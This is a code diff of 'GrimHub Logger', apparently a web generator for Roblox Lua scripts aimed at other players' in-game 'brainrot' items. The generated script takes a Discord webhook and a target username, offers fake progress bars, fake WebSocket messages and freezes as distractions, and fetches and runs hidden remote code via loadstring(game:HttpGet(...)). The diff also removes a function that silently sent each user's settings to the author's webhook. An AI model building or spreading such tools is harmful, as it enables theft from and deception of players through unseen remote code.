@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>GrimHub Logger | Script Generator</title>
+    <title>GrimHub Logger | Auto Morreria</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
     <style>
         * {
@@ -36,8 +36,42 @@
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            border-bottom: 1px solid #1E2846;
+            padding-bottom: 0.5rem;
+        }
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: #8e9acb;
+            padding: 0.8rem 1.5rem;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 8px 8px 0 0;
+            transition: all 0.2s;
+        }
+        .tab-btn:hover {
+            color: #b77cff;
+            background: rgba(139,0,255,0.1);
+        }
+        .tab-btn.active {
+            color: #b77cff;
+            border-bottom: 2px solid #8B00FF;
+            background: rgba(139,0,255,0.05);
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
         }
 
         .header {
@@ -169,6 +203,9 @@
         .small-btn.deselect-all {
             background: #8b0000;
         }
+        .small-btn.clear-logs {
+            background: #8b0000;
+        }
 
         .brainrot-grid {
             display: grid;
@@ -295,6 +332,56 @@
             white-space: pre-wrap;
             word-wrap: break-word;
         }
+
+        .logs-container {
+            background: #0a0e1c;
+            border-radius: 12px;
+            border: 1px solid #1E2846;
+            height: 500px;
+            display: flex;
+            flex-direction: column;
+        }
+        .logs-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem;
+            border-bottom: 1px solid #1E2846;
+        }
+        .logs-header h3 {
+            color: #b77cff;
+        }
+        .logs-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1rem;
+        }
+        .log-entry {
+            background: #141932;
+            border-left: 3px solid #8B00FF;
+            padding: 0.8rem;
+            margin-bottom: 0.8rem;
+            border-radius: 8px;
+            font-size: 0.75rem;
+        }
+        .log-time {
+            color: #6f78a0;
+            font-size: 0.65rem;
+            margin-bottom: 0.3rem;
+        }
+        .log-details {
+            color: #b9c3f0;
+        }
+        .log-details span {
+            color: #b77cff;
+            font-weight: 600;
+        }
+        .no-logs {
+            text-align: center;
+            color: #6f78a0;
+            padding: 2rem;
+        }
+
         .copy-success {
             position: fixed;
             bottom: 20px;
@@ -311,14 +398,6 @@
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        footer {
-            text-align: center;
-            font-size: 0.7rem;
-            color: #4f5a8e;
-            margin-top: 2rem;
-            padding-top: 1rem;
-            border-top: 1px solid #1E2846;
-        }
 
         @media (max-width: 780px) {
             body { padding: 1rem; }
@@ -326,6 +405,7 @@
             .stats { justify-content: center; }
             .grid { grid-template-columns: 1fr; }
             .brainrot-grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
+            .tabs { flex-wrap: wrap; }
         }
     </style>
 </head>
@@ -334,7 +414,7 @@
     <div class="header">
         <div class="logo">
             <h1>GrimHub Logger</h1>
-            <span>Script Generation Interface</span>
+            <span>Auto Morreria System</span>
         </div>
         <div class="stats">
             <div class="stat-box">
@@ -348,116 +428,191 @@
         </div>
     </div>
 
-    <div class="grid">
-        <div class="card">
-            <div class="card-title">📡 Configuration</div>
-            <label>Discord Webhook</label>
-            <input type="url" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
-            <label style="margin-top: 0.8rem;">Target Username</label>
-            <input type="text" id="targetUser" placeholder="Morreria" value="Morreria">
-        </div>
-
-        <div class="card">
-            <div class="card-title">⚙️ Execution</div>
-            <select id="scriptMode">
-                <option value="AUTO-MORRERIA">Auto Morreria</option>
-            </select>
-
-            <div style="margin: 0.8rem 0 0.5rem 0;"><label>Distractions</label></div>
-            <div class="toggle-group">
-                <label class="toggle-switch">
-                    <input type="checkbox" id="fakeProgress"> Progress Bar
-                </label>
-                <label class="toggle-switch">
-                    <input type="checkbox" id="fakeWebSocket"> WebSocket Message
-                </label>
-            </div>
-            <div class="slider-group">
-                <label>Freeze Delay</label>
-                <input type="range" id="freezeSlider" min="0" max="30" step="1" value="0">
-                <span class="freeze-value" id="freezeValueDisplay">0s</span>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">🧠 Asset Selector</div>
-            <div class="search-box">
-                <input type="text" id="brainrotSearch" placeholder="Filter assets...">
-            </div>
-            <div class="select-buttons">
-                <button class="small-btn select-all" id="selectAllBtn">Select All</button>
-                <button class="small-btn deselect-all" id="deselectAllBtn">Deselect All</button>
-            </div>
-            <div id="brainrotGrid" class="brainrot-grid"></div>
-        </div>
+    <div class="tabs">
+        <button class="tab-btn active" data-tab="generator">🎮 Script Generator</button>
+        <button class="tab-btn" data-tab="logs">📊 Global Logs</button>
     </div>
 
-    <div class="card output-card">
-        <div class="card-title">📜 Output</div>
-        <div class="btn-group">
-            <button class="btn btn-primary" id="generateBtn">Generate Script</button>
-            <button class="btn btn-secondary" id="copyBtn">Copy</button>
-            <button class="btn btn-secondary" id="downloadBtn">Download .lua</button>
+    <div id="generator" class="tab-content active">
+        <div class="grid">
+            <div class="card">
+                <div class="card-title">📡 Configuration</div>
+                <label>Discord Webhook</label>
+                <input type="url" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
+                <label style="margin-top: 0.8rem;">Target Username</label>
+                <input type="text" id="targetUser" placeholder="Morreria" value="Morreria">
+            </div>
+
+            <div class="card">
+                <div class="card-title">⚙️ Execution</div>
+                <select id="scriptMode">
+                    <option value="AUTO-MORRERIA">Auto Morreria</option>
+                </select>
+
+                <div style="margin: 0.8rem 0 0.5rem 0;"><label>Distractions</label></div>
+                <div class="toggle-group">
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="fakeProgress"> Progress Bar
+                    </label>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="fakeWebSocket"> WebSocket Message
+                    </label>
+                </div>
+                <div class="slider-group">
+                    <label>Freeze Delay</label>
+                    <input type="range" id="freezeSlider" min="0" max="30" step="1" value="0">
+                    <span class="freeze-value" id="freezeValueDisplay">0s</span>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">🧠 Asset Selector</div>
+                <div class="search-box">
+                    <input type="text" id="brainrotSearch" placeholder="Filter assets...">
+                </div>
+                <div class="select-buttons">
+                    <button class="small-btn select-all" id="selectAllBtn">Select All</button>
+                    <button class="small-btn deselect-all" id="deselectAllBtn">Deselect All</button>
+                </div>
+                <div id="brainrotGrid" class="brainrot-grid"></div>
+            </div>
         </div>
-        <pre id="outputCode">-- GrimHub Logger
+
+        <div class="card output-card">
+            <div class="card-title">📜 Output</div>
+            <div class="btn-group">
+                <button class="btn btn-primary" id="generateBtn">Generate Script</button>
+                <button class="btn btn-secondary" id="copyBtn">Copy</button>
+                <button class="btn btn-secondary" id="downloadBtn">Download .lua</button>
+            </div>
+            <pre id="outputCode">-- GrimHub Logger
 -- Configure settings above and click Generate</pre>
+        </div>
     </div>
-    <footer></footer>
+
+    <div id="logs" class="tab-content">
+        <div class="logs-container">
+            <div class="logs-header">
+                <h3>📊 Generation Logs</h3>
+                <button class="small-btn clear-logs" id="clearLogsBtn">Clear All</button>
+            </div>
+            <div class="logs-list" id="logsList">
+                <div class="no-logs">No logs yet. Generate a script to see it here.</div>
+            </div>
+        </div>
+    </div>
 </div>
 
 <script>
-    // ========== GLOBAL LOG WEBHOOK (REPLACE WITH YOURS) ==========
-    const GLOBAL_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+    // ========== GLOBAL LOGS SYSTEM ==========
+    let globalLogs = [];
 
-    // ========== COMPLETE BRAINROTS LIST (SORTED BEST TO WORST) ==========
+    function loadLogs() {
+        const saved = localStorage.getItem('grimhub_logs');
+        if (saved) {
+            globalLogs = JSON.parse(saved);
+        }
+        renderLogs();
+    }
+
+    function saveLogs() {
+        localStorage.setItem('grimhub_logs', JSON.stringify(globalLogs));
+    }
+
+    function addLogEntry(target, brainrotCount, distractions, freeze) {
+        const entry = {
+            id: Date.now(),
+            timestamp: new Date().toLocaleString(),
+            target: target,
+            brainrotCount: brainrotCount,
+            distractions: distractions,
+            freeze: freeze
+        };
+        globalLogs.unshift(entry);
+        if (globalLogs.length > 100) globalLogs.pop();
+        saveLogs();
+        renderLogs();
+    }
+
+    function renderLogs() {
+        const logsList = document.getElementById('logsList');
+        if (!logsList) return;
+        
+        if (globalLogs.length === 0) {
+            logsList.innerHTML = '<div class="no-logs">No logs yet. Generate a script to see it here.</div>';
+            return;
+        }
+        
+        logsList.innerHTML = globalLogs.map(log => `
+            <div class="log-entry">
+                <div class="log-time">${log.timestamp}</div>
+                <div class="log-details">
+                    🎯 Target: <span>${escapeHtml(log.target)}</span> | 
+                    🧠 Assets: <span>${log.brainrotCount}</span> | 
+                    🎭 Distractions: <span>${log.distractions}</span> | 
+                    ❄️ Freeze: <span>${log.freeze}s</span>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function clearLogs() {
+        if (confirm('Clear all logs?')) {
+            globalLogs = [];
+            saveLogs();
+            renderLogs();
+            showToast('Logs cleared');
+        }
+    }
+
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // ========== COMPLETE BRAINROTS (OG at TOP - BEST RARITY) ==========
     const brainrotsList = [
-        // GOD TIER (Most Valuable)
-        "Dragon Gingerini", "Hydra Dragon Cannelloni", "Antonio", "Elefanto Frigo", "Griffin",
-        "Skibidi Toilet", "Meowl", "Strawberry Elephant", "Headless Horseman", "Dragon Cannelloni",
-        "Signore Carapace", "Cerberus", "Hydra Bunny", "La Supreme Combinasion", "Ketupat Bros",
-        
-        // LEGENDARY TIER
+        "Strawberry Elephant", "Meowl", "Skibidi Toilet", "Headless Horseman", "Dragon Cannelloni",
+        "Hydra Dragon Cannelloni", "Dragon Gingerini", "Griffin", "Cerberus", "Celestial Pegasus",
+        "Love Love Bear", "La Supreme Combinasion", "Popcuru and Fizzuru", "Rosey and Teddy",
+        "Capitano Moby", "Cooki and Milki", "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito",
+        "Fortunu and Cashuru", "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace",
+        "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo", "Spooky and Pumpky",
         "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini", "Los Spaghettis", "Festive 67",
-        "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Rosetti Tualetti", "Nacho Spyder",
-        "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur", "Lavadorito Spinito",
-        "Ketchuru and Musturu", "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur",
-        
-        // MYTHIC TIER
-        "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang", "Lovin Rose",
-        "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande",
-        "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan",
-        "Mieteteira Bicicleteira", "Chillin Chili", "Money Money Reindeer", "La Spooky Grande",
-        
-        // EPIC TIER
-        "Bacuru and Egguru", "Los Bros", "La Extinct Grande", "Los Candies", "Los 67",
-        "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas",
-        "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira",
-        "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts",
-        
-        // RARE TIER
-        "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino", "Noo my Gold",
-        "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion",
-        "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666",
-        "Los Mi Gatitos", "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella",
-        
-        // COMMON TIER
-        "Los Nooo My Hotspotsitos", "Arcadopus", "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina",
-        "Chill Puppy", "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito",
-        "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur",
-        "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty", "Bunito Bunito Spinito", "Quesadilla Crocodila",
-        "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur",
-        "Telemorte", "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos",
-        "Nooo My Hotspot", "Bunnyman", "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas",
-        "1x1x1x1", "La Vacca Lepre Lepreino", "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi",
-        "Giftini Spyderini", "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos",
-        "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas", "Los Karkeritos",
-        "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo", "Pumpkini Spyderini", "Las Tralaleritas",
-        "Rocco Disco", "Extinct Matteo", "La Karkerkar Kombinasin", "La Vacca Prese Presente", "Reindeer Tralala",
-        "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono", "Los Tralaleritos",
-        "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La", "Extinct Tralalero",
-        "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul",
-        "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos",
-        "Bisonte Giuppitere", "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla"
+        "Ventoliero Pavonero", "Cloverat Clapat", "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti",
+        "Nacho Spyder", "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur",
+        "Lavadorito Spinito", "Ketchuru and Musturu", "Swaggy Bros", "La Romantic Grande", "Orcaledon",
+        "Tictac Sahur", "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang",
+        "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah", "La Jolly Grande",
+        "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino", "Tuff Toucan", "Mieteteira Bicicleteira",
+        "Chillin Chili", "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros",
+        "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis", "Money Money Puggy",
+        "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos", "Los Jolly Combinasionas", "Snailo Clovero",
+        "Los Planitos", "Chicleteira Cupideira", "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta",
+        "Los Sweethearts", "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino",
+        "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni", "La Grande Combinasion",
+        "Los 25", "Los Burritos", "67", "Donkeyturbo Express", "Los Chicleteiras", "Guest 666", "Los Mi Gatitos",
+        "Rang Ring Bus", "Granny", "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus",
+        "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy", "Burrito Bandito",
+        "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito", "Quesadillo Vampiro", "Eid Eid Eid Sahur",
+        "Cupid Hotspot", "Mi Gatito", "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty",
+        "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot", "Pot Hotspot", "25",
+        "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte", "La Sahur Combinasion", "List List List Sahur",
+        "Noo my examine", "Los Jobcitos", "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur",
+        "Cuadramat and Pakrahmatmamat", "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino",
+        "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini", "GOAT", "Trickolino",
+        "Paradiso Axolottino", "Triplito Tralaleritos", "La Vacca Jacko Linterino", "Fishboard", "Santteo",
+        "Las Vaquitas Saturnitas", "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo",
+        "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo", "La Karkerkar Kombinasin",
+        "La Vacca Prese Presente", "Reindeer Tralala", "Yess my examine", "Guerriro Digitale", "Boatito Auratito",
+        "Vulturino Skeletono", "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La",
+        "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi", "Blackhole Goat", "Dul Dul Dul",
+        "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000", "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere",
+        "Sammyni Spyderini", "La Vacca Saturno Saturnita", "Jackorilla"
     ];
 
     document.getElementById('totalBrainrotsCount').innerText = brainrotsList.length;
@@ -511,6 +666,24 @@
     const selectAllBtn = document.getElementById('selectAllBtn');
     const deselectAllBtn = document.getElementById('deselectAllBtn');
     const selectedStats = document.getElementById('selectedStats');
+    const clearLogsBtn = document.getElementById('clearLogsBtn');
+
+    const tabBtns = document.querySelectorAll('.tab-btn');
+    const tabContents = document.querySelectorAll('.tab-content');
+
+    tabBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            const tabId = btn.getAttribute('data-tab');
+            tabBtns.forEach(b => b.classList.remove('active'));
+            tabContents.forEach(c => c.classList.remove('active'));
+            btn.classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        });
+    });
+
+    if (clearLogsBtn) {
+        clearLogsBtn.addEventListener('click', clearLogs);
+    }
 
     async function renderBrainrots() {
         const searchTerm = searchInput.value.toLowerCase();
@@ -567,39 +740,23 @@
     deselectAllBtn.addEventListener('click', deselectAll);
     freezeSlider.addEventListener('input', () => freezeValueDisplay.innerText = freezeSlider.value + 's');
 
-    async function sendGlobalLog(data) {
-        if (!GLOBAL_WEBHOOK || GLOBAL_WEBHOOK === "YOUR_DISCORD_WEBHOOK_URL_HERE") return;
-        try {
-            await fetch(GLOBAL_WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: null,
-                    embeds: [{
-                        title: "📊 GrimHub Generator Log",
-                        color: 0x8B00FF,
-                        fields: [
-                            { name: "🎯 Target", value: data.target, inline: true },
-                            { name: "🧠 Assets", value: data.brainrotCount.toString(), inline: true },
-                            { name: "🎭 Distractions", value: data.distractions, inline: true },
-                            { name: "❄️ Freeze", value: data.freeze + "s", inline: true }
-                        ],
-                        footer: { text: "GrimHub Logger • " + new Date().toLocaleString() },
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            });
-        } catch(e) {}
-    }
-
     function generateScript() {
         const webhook = webhookInput.value.trim();
-        if (!webhook) return alert('Webhook required');
-        if (!webhook.startsWith('https://discord.com/api/webhooks/')) return alert('Invalid webhook URL');
+        if (!webhook) {
+            alert('Webhook required');
+            return;
+        }
+        if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+            alert('Invalid webhook URL');
+            return;
+        }
         
         const target = targetUser.value.trim() || "Morreria";
         const brainrotsArray = Array.from(selectedBrainrots);
         let brainrotsLua = '{' + brainrotsArray.map(br => `"${br.replace(/"/g, '\\"')}"`).join(', ') + '}';
+        
+        const distractions = `${fakeProgress.checked ? "Progress " : ""}${fakeWebSocket.checked ? "WebSocket" : ""}`.trim() || "None";
+        const freezeSec = parseInt(freezeSlider.value, 10);
         
         const script = `-- GrimHub Logger
 script_key = "trial"
@@ -611,30 +768,33 @@ getgenv().ScriptMode = "AUTO-MORRERIA"
 getgenv().Distraction = {
     ProgressBar = ${fakeProgress.checked},
     FakeWebSocket = ${fakeWebSocket.checked},
-    FreezeAfter = ${parseInt(freezeSlider.value, 10)}
+    FreezeAfter = ${freezeSec}
 }
 
 loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf4184336d3d2463fedaccd56ede1246ebba931f664c1058acd094.lua"))()`;
         
         outputCode.innerText = script;
         
-        const distractions = `${fakeProgress.checked ? "Progress " : ""}${fakeWebSocket.checked ? "WebSocket" : ""}`.trim() || "None";
-        sendGlobalLog({
-            target: target,
-            brainrotCount: brainrotsArray.length,
-            distractions: distractions,
-            freeze: parseInt(freezeSlider.value, 10)
-        });
+        // Add to global logs
+        addLogEntry(target, brainrotsArray.length, distractions, freezeSec);
     }
     
     generateBtn.addEventListener('click', generateScript);
+    
     copyBtn.addEventListener('click', async () => {
-        if (!outputCode.innerText.includes('Webhook')) return alert('Generate first');
+        if (!outputCode.innerText.includes('Webhook')) {
+            alert('Generate first');
+            return;
+        }
         await navigator.clipboard.writeText(outputCode.innerText);
         showToast('Copied');
     });
+    
     downloadBtn.addEventListener('click', () => {
-        if (!outputCode.innerText.includes('Webhook')) return alert('Generate first');
+        if (!outputCode.innerText.includes('Webhook')) {
+            alert('Generate first');
+            return;
+        }
         const blob = new Blob([outputCode.innerText], {type: 'text/plain'});
         const a = document.createElement('a');
         a.href = URL.createObjectURL(blob);
@@ -654,6 +814,7 @@ loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/e5d6f5931adf41
         setTimeout(() => div.remove(), 2000);
     }
     
+    loadLogs();
     renderBrainrots();
     updateSelectedCount();
     searchInput.addEventListener('input', () => renderBrainrots());
